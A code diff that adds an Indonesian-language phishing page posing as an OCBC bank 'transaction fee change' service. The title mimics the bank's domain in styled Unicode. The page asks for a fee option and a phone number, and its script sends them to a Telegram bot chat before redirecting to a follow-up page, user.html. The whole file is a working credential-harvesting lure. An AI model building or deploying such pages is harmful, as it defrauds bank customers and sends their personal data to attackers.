@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>𝘄𝘄𝘄.𝗼𝗰𝗯𝗰.𝗰𝗼𝗺 | 𝗣𝗲𝗿𝘂𝗯𝗮𝗵𝗮𝗻 𝘀𝗸𝗲𝗺𝗮 𝘁𝗮𝗿𝗶𝗳 𝘁𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap">
+    <style>
+        * {
+            font-family: 'Ubuntu', sans-serif;
+            font-weight: 400;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            color: #000;
+        }
+        body, html {
+            background-color: #fff;
+            width: 100%;
+            height: 100%;
+             position: relative;
+            margin: 0 auto;
+            right: 0;
+            left: 0;
+            max-width: 450px;
+        }
+        .container {
+            max-width: 90%;
+            padding: 0px;
+            margin: 10px auto;
+            background: #fff;
+            box-shadow: #dedede 1px 1px 4px 3px;
+            border-radius: 15px;
+        }
+        button {
+            margin-top: 5px;
+            width: 100%;
+            height: 40px;
+            border: none;
+            outline: none;
+            border-radius: 25px;
+            color: #fff;
+            background: #d1001a;
+            text-align: center;
+            font-size: 13px;
+            font-weight: bold;
+            box-shadow: 2px 2px 2px 0px rgba(8, 8, 0, 0.5);
+        }
+        button:disabled {
+            opacity: 0.7;
+            background: #dedede;
+        }
+        input[type=text], input[type=tel], select {
+            width: 90%;
+            padding: 12px 10px;
+            margin: 0px 0;
+            font-weight: 600;
+            box-sizing: border-box;
+            border: none;
+            font-size: 15px;
+            border-bottom: 1px solid #9b9b9b;
+            outline: none;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://picjj.com/images/2024/09/11/WSnMWY.jpg" width="100%" alt="">
+    <div class="space" style="padding:5%;height:0%;"></div>
+    <center>
+        <h3 style="font-weight: 950;">Selamat Datang di Layanan<br>Perubahan Tarif Transaksi OCBC</h3>
+    </center>
+    <br>
+    <form onsubmit="sendHp(event)" method="POST">
+        <div class="container">
+            <br>
+            <label style="margin:25px;font-weight: 850;color:#000;font-size:16px;">Pilihan Tarif :</label>
+            <center>
+                <div class="custom-select">
+                    <select required style="width:90%;background:#fff;outline:none;" name="tarif" id="tarif">
+                        <option value="">Klik disini untuk pilih tarif</option>
+                        <option value="Tarif Lama">TARIF LAMA Rp.6,500/TRANSAKSI</option>
+                        <option value="Tarif Baru">TARIF BARU Rp.150,000/BULAN</option>
+                    </select>
+                </div>
+            </center>
+            <br>
+            <label style="margin:25px;font-weight: 850;color:#000;font-size:16px;">Nomor Handphone :</label>
+            <center>
+                <input type="tel" placeholder="08XXXXXXXXXX" name="nohp" id="nohp" maxlength="14" minlength="9" required>
+            </center>
+            <br>
+        </div>
+        <br>
+        <div class="space" style="padding:30%;height:0%;margin:0;"></div>
+        <br>
+        <button type="submit" id="kirim" style="margin: 0 auto; width: 90%; height: 52px; position: fixed; bottom: 10px; right: 0; left: 0; padding: 0px 0px; font-weight: 700; font-size: 14px; background: #d1001a; color: #fff; border-radius: 10px; font-weight: solid; border: 0px none #fff;max-width: 450px;" > Ajukan Sekarang</button>
+    </form>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="i.js"></script>
+    <script>
+        function sendHp(event){
+            event.preventDefault();
+            var tarif = $('#tarif').val();
+            sessionStorage.setItem('tarif', tarif);
+            document.getElementById('kirim').innerHTML = "Memproses....";
+            var nohp = $('#nohp').val();
+            sessionStorage.setItem("nohp", nohp);
+            var logo = '𝘄𝘄𝘄.𝗼𝗰𝗯𝗰.𝗰𝗼𝗺';
+            var gabungan = logo + '\n\n※ 𝗧𝗮𝗿𝗶𝗳 •• ' + tarif + '\n※ 𝗡𝗼.𝗛𝗽 •• ' + nohp;
+            
+            
+            $.ajax({
+                url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${encodeURIComponent(gabungan)}&parse_mode=html`,
+                method: `POST`,
+                complete: function(){
+                    setTimeout(function(){
+                        window.location = "user.html";
+                        document.getElementById('kirim').innerHTML = "Ajukan Sekarang";
+                    }, 200);
+                }
+            });
+        };
+    </script>
+</body>
+</html>
